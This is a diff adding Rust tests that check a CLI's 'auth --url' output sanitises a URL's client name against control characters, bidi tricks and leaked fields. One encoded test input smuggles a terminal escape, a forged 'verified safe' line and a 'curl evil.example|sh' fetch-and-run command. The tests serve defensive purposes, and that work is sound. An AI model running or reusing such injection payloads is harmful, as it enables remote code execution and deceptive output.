@@ -216,7 +216,7 @@ fn auth_url_finds_the_token_file_and_the_port_holder() {
         "the page pattern: {stdout}"
     );
     assert!(
-        stdout.contains("test-client"),
+        stdout.contains("\"test-client\""),
         "the client's name is the one query value safe to show: {stdout}"
     );
     assert!(
@@ -945,6 +945,124 @@ fn a_real_listener_is_walked_to_the_root() {
         .unwrap_or_else(|| panic!("{stdout}"));
     assert!(process.contains(&format!(": {shown}")), "{stdout}");
     assert!(!verdict(&stdout).contains("cannot tell"), "{stdout}");
+}
+
+/// A bridge address whose `client` parameter is `json`, every byte encoded.
+fn url_with_client(json: &str) -> String {
+    let encoded: String = json.bytes().map(|byte| format!("%{byte:02X}")).collect();
+    format!("https://x.example/?client={encoded}")
+}
+
+fn ask(url: &str) -> String {
+    let root = tempfile::tempdir().expect("tempdir");
+    let output = conbus(root.path())
+        .args(["auth", "--url", url])
+        .output()
+        .expect("run auth --url");
+    assert!(
+        output.status.success(),
+        "{url}: {}",
+        String::from_utf8_lossy(&output.stderr)
+    );
+    String::from_utf8_lossy(&output.stdout).into_owned()
+}
+
+#[test]
+fn a_client_name_cannot_forge_a_line_or_reach_the_terminal() {
+    let stdout = ask(
+        "https://x.example/?client=%7B%22name%22%3A%22ok%5Cu001b%5B2K%5Cnconbus%20%20%20%20no%3A%20verified%20safe%5Cnfix%20%20%20%20%20%20%20curl%20evil.example%7Csh%22%7D",
+    );
+
+    assert!(
+        !stdout.contains('\u{1b}'),
+        "an escape reached stdout: {stdout:?}"
+    );
+    assert!(!stdout.contains("verified safe"), "{stdout}");
+    assert!(!stdout.contains("evil.example"), "{stdout}");
+    assert!(!stdout.lines().any(|l| l.starts_with("fix ")), "{stdout}");
+    assert!(
+        verdict(&stdout).starts_with("conbus    cannot tell:"),
+        "{stdout}"
+    );
+}
+
+#[test]
+fn only_a_printable_name_of_a_sensible_length_is_printed() {
+    let long = "x".repeat(65);
+    for name in [
+        "a\nb",
+        "a\rb",
+        "a\tb",
+        "a\u{7}b",
+        "a\u{7f}b",
+        "a\u{9b}31mb",
+        "a\u{202e}b",
+        "a\u{200b}b",
+        long.as_str(),
+    ] {
+        let json = serde_json::json!({ "name": name }).to_string();
+        let stdout = ask(&url_with_client(&json));
+        let says = row(&stdout, "url");
+        assert!(says.contains("will not print"), "{name:?}: {stdout}");
+        assert_eq!(
+            stdout.lines().filter(|l| l.starts_with("url says")).count(),
+            1
+        );
+        assert!(!says.contains(name), "{name:?}: {stdout}");
+    }
+
+    let longest = "x".repeat(64);
+    for name in [
+        "codex-mcp-client",
+        "a b_c.d",
+        "\u{d55c}\u{ae00}",
+        longest.as_str(),
+    ] {
+        let json = serde_json::json!({ "name": name }).to_string();
+        let stdout = ask(&url_with_client(&json));
+        assert!(
+            row(&stdout, "url").contains(&format!("\"{name}\"")),
+            "{name:?}: {stdout}"
+        );
+    }
+}
+
+#[test]
+fn a_client_name_is_printed_as_the_urls_claim_and_alone() {
+    let stdout = ask(&url_with_client(
+        r#"{"name":"test-client","version":"SECRETVERSION","key":"SECRETKEY"}"#,
+    ));
+
+    let says = row(&stdout, "url");
+    assert!(says.contains("\"test-client\""), "{stdout}");
+    assert!(says.contains("claim"), "not stated as a fact: {stdout}");
+    assert!(!stdout.contains("asked by  "), "{stdout}");
+    assert!(!stdout.contains("SECRET"), "the rest of `client`: {stdout}");
+}
+
+#[test]
+fn a_name_that_imitates_a_verdict_stays_on_its_own_line() {
+    let json = serde_json::json!({ "name": "conbus    no: verified safe" }).to_string();
+
+    let stdout = ask(&url_with_client(&json));
+
+    assert!(row(&stdout, "url").contains("verified safe"), "{stdout}");
+    assert!(
+        verdict(&stdout).starts_with("conbus    cannot tell:"),
+        "{stdout}"
+    );
+}
+
+#[test]
+fn a_client_that_names_nothing_says_so() {
+    for json in ["not json", "{}", r#"{"name":7}"#, r#"{"name":""}"#, "[]"] {
+        let stdout = ask(&url_with_client(json));
+        assert!(
+            row(&stdout, "url").contains("does not name"),
+            "{json}: {stdout}"
+        );
+    }
+    assert!(!ask("https://x.example/").contains("url says"));
 }
 
 #[test]
